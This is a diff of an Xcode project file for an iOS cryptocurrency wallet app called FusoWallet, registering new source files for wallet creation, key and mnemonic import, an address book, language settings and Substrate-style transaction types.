@@ -13,6 +13,16 @@
 		8B026F6425E6472F0017EDF8 /* WithdrawViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B026F6325E6472F0017EDF8 /* WithdrawViewController.m */; };
 		8B10D56F25E4AFBB00FED56D /* RestoreIdentityViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */; };
 		8B10D57525E4B0A400FED56D /* CALayer+boardColor.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */; };
+		8B1F9017260AE6A80000C417 /* TransferAddressModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B1F9016260AE6A80000C417 /* TransferAddressModel.m */; };
+		8B1F9030260B203C0000C417 /* NoDataTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B1F902E260B203C0000C417 /* NoDataTableViewCell.m */; };
+		8B1F9031260B203C0000C417 /* NoDataTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8B1F902F260B203C0000C417 /* NoDataTableViewCell.xib */; };
+		8B2606E225F2293B003B44C4 /* AddWalletTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B2606E125F2293B003B44C4 /* AddWalletTableViewController.m */; };
+		8B2606EB25F22B62003B44C4 /* CreatWalletTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B2606EA25F22B62003B44C4 /* CreatWalletTableViewController.m */; };
+		8B31D74325E77DA400DF54C4 /* DepositViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B31D74225E77DA400DF54C4 /* DepositViewController.m */; };
+		8B31D75A25E7B91000DF54C4 /* NavView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8B31D75925E7B91000DF54C4 /* NavView.xib */; };
+		8B31D76025E7BA5700DF54C4 /* NavView.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B31D75F25E7BA5700DF54C4 /* NavView.m */; };
+		8B31D77225E7D44000DF54C4 /* AddressBookViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B31D77125E7D44000DF54C4 /* AddressBookViewController.m */; };
+		8B31D77E25E7DD6600DF54C4 /* AddressBookTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B31D77D25E7DD6600DF54C4 /* AddressBookTableViewCell.m */; };
 		8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */; };
 		8B42660425E0AC0F001DE5CB /* BaseNavTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660325E0AC0F001DE5CB /* BaseNavTableViewController.m */; };
 		8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660925E0AC2F001DE5CB /* BaseNavViewController.m */; };
@@ -38,11 +48,21 @@
 		8B5E9C8D25DFB763006C33B0 /* NSString+Base64.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C8925DFB763006C33B0 /* NSString+Base64.m */; };
 		8B5E9C8E25DFB763006C33B0 /* RpcRequest.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C8B25DFB763006C33B0 /* RpcRequest.m */; };
 		8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C9325DFB792006C33B0 /* WebSocketManager.m */; };
-		8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CAB25DFBECD006C33B0 /* File.swift */; };
+		8B5E9CAC25DFBECD006C33B0 /* SwiftFunction.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CAB25DFBECD006C33B0 /* SwiftFunction.swift */; };
 		8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */; };
 		8B71C87325E353460081A224 /* UserInfoModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C87225E353460081A224 /* UserInfoModel.m */; };
 		8B71C8AD25E3948F0081A224 /* VerifyMnemonicViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C8AC25E3948F0081A224 /* VerifyMnemonicViewController.m */; };
 		8B71C8BB25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C8BA25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m */; };
+		8B7577DF25E893F500B9EBA0 /* CreatAddressBookTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7577DE25E893F500B9EBA0 /* CreatAddressBookTableViewController.m */; };
+		8B766D6125ECDA1E0027378D /* LanguageSelectedModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B766D6025ECDA1E0027378D /* LanguageSelectedModel.m */; };
+		8B766D9F25ED05C90027378D /* ImportPrivateKeyViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B766D9725ED05C90027378D /* ImportPrivateKeyViewController.m */; };
+		8B766DA025ED05C90027378D /* ImportKeystoreViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B766D9825ED05C90027378D /* ImportKeystoreViewController.m */; };
+		8B766DA125ED05C90027378D /* ImportAccountViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B766D9A25ED05C90027378D /* ImportAccountViewController.m */; };
+		8B766DA225ED05C90027378D /* ImportMnemonicViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B766D9D25ED05C90027378D /* ImportMnemonicViewController.m */; };
+		8B766DB125ED18790027378D /* ImportAccountSegmentViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B766DB025ED18790027378D /* ImportAccountSegmentViewController.m */; };
+		8B78D4FE25ECC62B0066BA78 /* SettingTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B78D4FD25ECC62B0066BA78 /* SettingTableViewController.m */; };
+		8B78D50725ECCB6D0066BA78 /* LanguageSelectTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B78D50625ECCB6D0066BA78 /* LanguageSelectTableViewController.m */; };
+		8B78D50D25ECD6BF0066BA78 /* LanguageSelectTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B78D50C25ECD6BF0066BA78 /* LanguageSelectTableViewCell.m */; };
 		8B7A5D1D25E4F8B900217A31 /* CoinModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5D1C25E4F8B800217A31 /* CoinModel.m */; };
 		8B7A5D3225E501FF00217A31 /* DefaultSelectBackgroundViewTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5D3125E501FE00217A31 /* DefaultSelectBackgroundViewTableViewCell.m */; };
 		8B7A5D7C25E51B5B00217A31 /* Wallet.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8B7A5D7B25E51B5B00217A31 /* Wallet.storyboard */; };
@@ -54,8 +74,23 @@
 		8B7A5DB125E5350B00217A31 /* AllTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DB025E5350B00217A31 /* AllTableViewController.m */; };
 		8B7A5DB725E5353000217A31 /* InTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DB625E5353000217A31 /* InTableViewController.m */; };
 		8B7A5DBD25E5353C00217A31 /* OutTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DBC25E5353C00217A31 /* OutTableViewController.m */; };
+		8B94C64226099AAA0011627C /* InputChangeBorderColorView.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B94C64126099AAA0011627C /* InputChangeBorderColorView.m */; };
 		8BB3B27625E4DC6C00E7F010 /* WalletViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BB3B27525E4DC6C00E7F010 /* WalletViewController.m */; };
 		8BB3B27C25E4DC8F00E7F010 /* MineTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */; };
+		8BC6BE0425F0CA620091E238 /* UnlockChunk.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BDFD25F0CA620091E238 /* UnlockChunk.swift */; };
+		8BC6BE0525F0CA620091E238 /* AccountId.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BDFE25F0CA620091E238 /* AccountId.swift */; };
+		8BC6BE0625F0CA620091E238 /* Extrinsic.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BDFF25F0CA620091E238 /* Extrinsic.swift */; };
+		8BC6BE0725F0CA620091E238 /* TransferCall.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE0025F0CA620091E238 /* TransferCall.swift */; };
+		8BC6BE0825F0CA620091E238 /* StakingLedger.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE0125F0CA620091E238 /* StakingLedger.swift */; };
+		8BC6BE0925F0CA620091E238 /* AccountInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE0225F0CA620091E238 /* AccountInfo.swift */; };
+		8BC6BE0A25F0CA620091E238 /* Era.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE0325F0CA620091E238 /* Era.swift */; };
+		8BC6BE1225F0CBAE0091E238 /* AccountItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE1125F0CBAE0091E238 /* AccountItem.swift */; };
+		8BC6BE1725F0CBFB0091E238 /* ManagedAccountItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE1625F0CBFB0091E238 /* ManagedAccountItem.swift */; };
+		8BC6BE1C25F0CC9E0091E238 /* CryptoType+Extrinsic.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8BC6BE1B25F0CC9E0091E238 /* CryptoType+Extrinsic.swift */; };
+		8BD7420D25EA1E6A0012C52C /* WalletManagerTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BD7420C25EA1E6A0012C52C /* WalletManagerTableViewCell.m */; };
+		8BD7421325EA200C0012C52C /* WalletManageViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BD7421225EA200C0012C52C /* WalletManageViewController.m */; };
+		8BD7421C25EA2F190012C52C /* WalletManagerDetailTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BD7421B25EA2F190012C52C /* WalletManagerDetailTableViewController.m */; };
+		8BD7422825EA4B5D0012C52C /* ExportPublicKeyViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BD7422725EA4B5D0012C52C /* ExportPublicKeyViewController.m */; };
 		8BF0FC0125E6585C002E65B1 /* WBQRCodeVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BF0FBFF25E6585C002E65B1 /* WBQRCodeVC.m */; };
 		A58D7BF63F1E7A408FF06863 /* Pods_FusoWallet.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */; };
 /* End PBXBuildFile section */
@@ -92,6 +127,24 @@
 		8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RestoreIdentityViewController.m; sourceTree = "<group>"; };
 		8B10D57325E4B0A400FED56D /* CALayer+boardColor.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "CALayer+boardColor.h"; sourceTree = "<group>"; };
 		8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "CALayer+boardColor.m"; sourceTree = "<group>"; };
+		8B1F9015260AE6A80000C417 /* TransferAddressModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TransferAddressModel.h; sourceTree = "<group>"; };
+		8B1F9016260AE6A80000C417 /* TransferAddressModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TransferAddressModel.m; sourceTree = "<group>"; };
+		8B1F902D260B203C0000C417 /* NoDataTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NoDataTableViewCell.h; sourceTree = "<group>"; };
+		8B1F902E260B203C0000C417 /* NoDataTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = NoDataTableViewCell.m; sourceTree = "<group>"; };
+		8B1F902F260B203C0000C417 /* NoDataTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NoDataTableViewCell.xib; sourceTree = "<group>"; };
+		8B2606E025F2293B003B44C4 /* AddWalletTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AddWalletTableViewController.h; sourceTree = "<group>"; };
+		8B2606E125F2293B003B44C4 /* AddWalletTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AddWalletTableViewController.m; sourceTree = "<group>"; };
+		8B2606E925F22B62003B44C4 /* CreatWalletTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CreatWalletTableViewController.h; sourceTree = "<group>"; };
+		8B2606EA25F22B62003B44C4 /* CreatWalletTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CreatWalletTableViewController.m; sourceTree = "<group>"; };
+		8B31D74125E77DA400DF54C4 /* DepositViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DepositViewController.h; sourceTree = "<group>"; };
+		8B31D74225E77DA400DF54C4 /* DepositViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DepositViewController.m; sourceTree = "<group>"; };
+		8B31D75925E7B91000DF54C4 /* NavView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NavView.xib; sourceTree = "<group>"; };
+		8B31D75E25E7BA5700DF54C4 /* NavView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NavView.h; sourceTree = "<group>"; };
+		8B31D75F25E7BA5700DF54C4 /* NavView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = NavView.m; sourceTree = "<group>"; };
+		8B31D77025E7D44000DF54C4 /* AddressBookViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AddressBookViewController.h; sourceTree = "<group>"; };
+		8B31D77125E7D44000DF54C4 /* AddressBookViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AddressBookViewController.m; sourceTree = "<group>"; };
+		8B31D77C25E7DD6600DF54C4 /* AddressBookTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AddressBookTableViewCell.h; sourceTree = "<group>"; };
+		8B31D77D25E7DD6600DF54C4 /* AddressBookTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AddressBookTableViewCell.m; sourceTree = "<group>"; };
 		8B4265F925E0ABE7001DE5CB /* BaseViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseViewController.h; sourceTree = "<group>"; };
 		8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BaseViewController.m; sourceTree = "<group>"; };
 		8B42660225E0AC0F001DE5CB /* BaseNavTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseNavTableViewController.h; sourceTree = "<group>"; };
@@ -140,7 +193,7 @@
 		8B5E9C9225DFB792006C33B0 /* WebSocketManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WebSocketManager.h; sourceTree = "<group>"; };
 		8B5E9C9325DFB792006C33B0 /* WebSocketManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WebSocketManager.m; sourceTree = "<group>"; };
 		8B5E9CAA25DFBECC006C33B0 /* FusoWallet-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FusoWallet-Bridging-Header.h"; sourceTree = "<group>"; };
-		8B5E9CAB25DFBECD006C33B0 /* File.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = File.swift; sourceTree = "<group>"; };
+		8B5E9CAB25DFBECD006C33B0 /* SwiftFunction.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwiftFunction.swift; sourceTree = "<group>"; };
 		8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "StorageKeyFactory+Implicit.swift"; sourceTree = "<group>"; };
 		8B71C87125E353460081A224 /* UserInfoModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = UserInfoModel.h; sourceTree = "<group>"; };
 		8B71C87225E353460081A224 /* UserInfoModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = UserInfoModel.m; sourceTree = "<group>"; };
@@ -148,6 +201,26 @@
 		8B71C8AC25E3948F0081A224 /* VerifyMnemonicViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = VerifyMnemonicViewController.m; sourceTree = "<group>"; };
 		8B71C8B925E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = JYEqualCellSpaceFlowLayout.h; sourceTree = "<group>"; };
 		8B71C8BA25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = JYEqualCellSpaceFlowLayout.m; sourceTree = "<group>"; };
+		8B7577DD25E893F500B9EBA0 /* CreatAddressBookTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CreatAddressBookTableViewController.h; sourceTree = "<group>"; };
+		8B7577DE25E893F500B9EBA0 /* CreatAddressBookTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CreatAddressBookTableViewController.m; sourceTree = "<group>"; };
+		8B766D5F25ECDA1E0027378D /* LanguageSelectedModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LanguageSelectedModel.h; sourceTree = "<group>"; };
+		8B766D6025ECDA1E0027378D /* LanguageSelectedModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = LanguageSelectedModel.m; sourceTree = "<group>"; };
+		8B766D9725ED05C90027378D /* ImportPrivateKeyViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ImportPrivateKeyViewController.m; sourceTree = "<group>"; };
+		8B766D9825ED05C90027378D /* ImportKeystoreViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ImportKeystoreViewController.m; sourceTree = "<group>"; };
+		8B766D9925ED05C90027378D /* ImportMnemonicViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ImportMnemonicViewController.h; sourceTree = "<group>"; };
+		8B766D9A25ED05C90027378D /* ImportAccountViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ImportAccountViewController.m; sourceTree = "<group>"; };
+		8B766D9B25ED05C90027378D /* ImportPrivateKeyViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ImportPrivateKeyViewController.h; sourceTree = "<group>"; };
+		8B766D9C25ED05C90027378D /* ImportAccountViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ImportAccountViewController.h; sourceTree = "<group>"; };
+		8B766D9D25ED05C90027378D /* ImportMnemonicViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ImportMnemonicViewController.m; sourceTree = "<group>"; };
+		8B766D9E25ED05C90027378D /* ImportKeystoreViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ImportKeystoreViewController.h; sourceTree = "<group>"; };
+		8B766DAF25ED18790027378D /* ImportAccountSegmentViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ImportAccountSegmentViewController.h; sourceTree = "<group>"; };
+		8B766DB025ED18790027378D /* ImportAccountSegmentViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ImportAccountSegmentViewController.m; sourceTree = "<group>"; };
+		8B78D4FC25ECC62B0066BA78 /* SettingTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SettingTableViewController.h; sourceTree = "<group>"; };
+		8B78D4FD25ECC62B0066BA78 /* SettingTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SettingTableViewController.m; sourceTree = "<group>"; };
+		8B78D50525ECCB6D0066BA78 /* LanguageSelectTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LanguageSelectTableViewController.h; sourceTree = "<group>"; };
+		8B78D50625ECCB6D0066BA78 /* LanguageSelectTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = LanguageSelectTableViewController.m; sourceTree = "<group>"; };
+		8B78D50B25ECD6BF0066BA78 /* LanguageSelectTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LanguageSelectTableViewCell.h; sourceTree = "<group>"; };
+		8B78D50C25ECD6BF0066BA78 /* LanguageSelectTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = LanguageSelectTableViewCell.m; sourceTree = "<group>"; };
 		8B7A5D1B25E4F8B800217A31 /* CoinModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CoinModel.h; sourceTree = "<group>"; };
 		8B7A5D1C25E4F8B800217A31 /* CoinModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CoinModel.m; sourceTree = "<group>"; };
 		8B7A5D3025E501FE00217A31 /* DefaultSelectBackgroundViewTableViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DefaultSelectBackgroundViewTableViewCell.h; sourceTree = "<group>"; };
@@ -168,10 +241,30 @@
 		8B7A5DB625E5353000217A31 /* InTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = InTableViewController.m; sourceTree = "<group>"; };
 		8B7A5DBB25E5353C00217A31 /* OutTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = OutTableViewController.h; sourceTree = "<group>"; };
 		8B7A5DBC25E5353C00217A31 /* OutTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = OutTableViewController.m; sourceTree = "<group>"; };
+		8B94C64026099AAA0011627C /* InputChangeBorderColorView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = InputChangeBorderColorView.h; sourceTree = "<group>"; };
+		8B94C64126099AAA0011627C /* InputChangeBorderColorView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = InputChangeBorderColorView.m; sourceTree = "<group>"; };
 		8BB3B27425E4DC6C00E7F010 /* WalletViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WalletViewController.h; sourceTree = "<group>"; };
 		8BB3B27525E4DC6C00E7F010 /* WalletViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WalletViewController.m; sourceTree = "<group>"; };
 		8BB3B27A25E4DC8F00E7F010 /* MineTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MineTableViewController.h; sourceTree = "<group>"; };
 		8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MineTableViewController.m; sourceTree = "<group>"; };
+		8BC6BDFD25F0CA620091E238 /* UnlockChunk.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UnlockChunk.swift; sourceTree = "<group>"; };
+		8BC6BDFE25F0CA620091E238 /* AccountId.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AccountId.swift; sourceTree = "<group>"; };
+		8BC6BDFF25F0CA620091E238 /* Extrinsic.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Extrinsic.swift; sourceTree = "<group>"; };
+		8BC6BE0025F0CA620091E238 /* TransferCall.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TransferCall.swift; sourceTree = "<group>"; };
+		8BC6BE0125F0CA620091E238 /* StakingLedger.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StakingLedger.swift; sourceTree = "<group>"; };
+		8BC6BE0225F0CA620091E238 /* AccountInfo.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AccountInfo.swift; sourceTree = "<group>"; };
+		8BC6BE0325F0CA620091E238 /* Era.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Era.swift; sourceTree = "<group>"; };
+		8BC6BE1125F0CBAE0091E238 /* AccountItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AccountItem.swift; sourceTree = "<group>"; };
+		8BC6BE1625F0CBFB0091E238 /* ManagedAccountItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ManagedAccountItem.swift; sourceTree = "<group>"; };
+		8BC6BE1B25F0CC9E0091E238 /* CryptoType+Extrinsic.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "CryptoType+Extrinsic.swift"; sourceTree = "<group>"; };
+		8BD7420B25EA1E6A0012C52C /* WalletManagerTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WalletManagerTableViewCell.h; sourceTree = "<group>"; };
+		8BD7420C25EA1E6A0012C52C /* WalletManagerTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WalletManagerTableViewCell.m; sourceTree = "<group>"; };
+		8BD7421125EA200C0012C52C /* WalletManageViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WalletManageViewController.h; sourceTree = "<group>"; };
+		8BD7421225EA200C0012C52C /* WalletManageViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WalletManageViewController.m; sourceTree = "<group>"; };
+		8BD7421A25EA2F190012C52C /* WalletManagerDetailTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WalletManagerDetailTableViewController.h; sourceTree = "<group>"; };
+		8BD7421B25EA2F190012C52C /* WalletManagerDetailTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WalletManagerDetailTableViewController.m; sourceTree = "<group>"; };
+		8BD7422625EA4B5D0012C52C /* ExportPublicKeyViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ExportPublicKeyViewController.h; sourceTree = "<group>"; };
+		8BD7422725EA4B5D0012C52C /* ExportPublicKeyViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ExportPublicKeyViewController.m; sourceTree = "<group>"; };
 		8BF0FBFF25E6585C002E65B1 /* WBQRCodeVC.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WBQRCodeVC.m; sourceTree = "<group>"; };
 		8BF0FC0025E6585C002E65B1 /* WBQRCodeVC.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WBQRCodeVC.h; sourceTree = "<group>"; };
 		989BD21863DBE7F239680040 /* Pods-FusoWallet.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.debug.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.debug.xcconfig"; sourceTree = "<group>"; };
@@ -269,6 +362,10 @@
 				8B71C8AC25E3948F0081A224 /* VerifyMnemonicViewController.m */,
 				8B10D56D25E4AFBB00FED56D /* RestoreIdentityViewController.h */,
 				8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */,
+				8B2606E025F2293B003B44C4 /* AddWalletTableViewController.h */,
+				8B2606E125F2293B003B44C4 /* AddWalletTableViewController.m */,
+				8B2606E925F22B62003B44C4 /* CreatWalletTableViewController.h */,
+				8B2606EA25F22B62003B44C4 /* CreatWalletTableViewController.m */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -325,8 +422,8 @@
 				8B4265F825E0ABCB001DE5CB /* Base */,
 				8B5E9C7F25DFB6E6006C33B0 /* Tools */,
 				8B42661425E0B0AA001DE5CB /* LoginRegister */,
-				8BB3B27025E4DB9100E7F010 /* Mine */,
 				8BB3B26F25E4DB8700E7F010 /* Wallet */,
+				8BB3B27025E4DB9100E7F010 /* Mine */,
 				8B5E9C0C25DF64DC006C33B0 /* AppDelegate.h */,
 				8B5E9C0D25DF64DC006C33B0 /* AppDelegate.m */,
